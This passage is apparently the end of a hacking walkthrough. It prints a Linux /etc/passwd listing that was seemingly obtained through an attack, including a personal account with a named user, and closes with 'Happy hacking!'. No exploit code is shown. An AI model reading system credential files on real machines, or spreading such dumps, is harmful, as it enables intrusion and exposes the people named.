messagebus:x:102:107::/var/run/dbus:/bin/false                                                                               
avahi-autoipd:x:103:110:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false                                             
avahi:x:104:111:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false                                                        
couchdb:x:105:113:CouchDB Administrator,,,:/var/lib/couchdb:/bin/bash                                                        
speech-dispatcher:x:106:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh                                           
usbmux:x:107:46:usbmux daemon,,,:/home/usbmux:/bin/false                                                                     
haldaemon:x:108:114:Hardware abstraction layer,,,:/var/run/hald:/bin/false                                                   
kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false                                                             
pulse:x:110:115:PulseAudio daemon,,,:/var/run/pulse:/bin/false                                                               
rtkit:x:111:117:RealtimeKit,,,:/proc:/bin/false                                                                              
saned:x:112:118::/home/saned:/bin/false                                                                             
   
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false                                                                 
gdm:x:114:120:Gnome Display Manager:/var/lib/gdm:/bin/false                                                                  
stalker:x:1000:1000:Juan Stange,,,:/home/stalker:/bin/bash                                                                   
jetty:x:115:123::/usr/share/jetty:/bin/false                                                                                
mysql:x:116:124:MySQL Server,,,:/var/lib/mysql:/bin/false                                                                    
sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin                                                                            
ia8a7   2                                                                                                                    

Voila! Happy hacking!

```